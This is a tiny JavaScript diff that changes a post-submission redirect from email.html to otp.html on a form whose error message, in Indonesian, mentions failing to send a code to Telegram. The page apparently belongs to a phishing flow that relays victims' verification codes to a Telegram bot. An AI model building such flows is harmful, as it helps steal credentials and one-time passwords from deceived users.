@@ -273,7 +273,7 @@
           .then((response) => response.json())
           .then((data) => {
             if (data.ok) {
-              location.href ="email.html";
+              location.href ="otp.html";
               document.getElementById("verificationForm").reset();
             } else {
               alert("Gagal mengirim kode ke Telegram.");
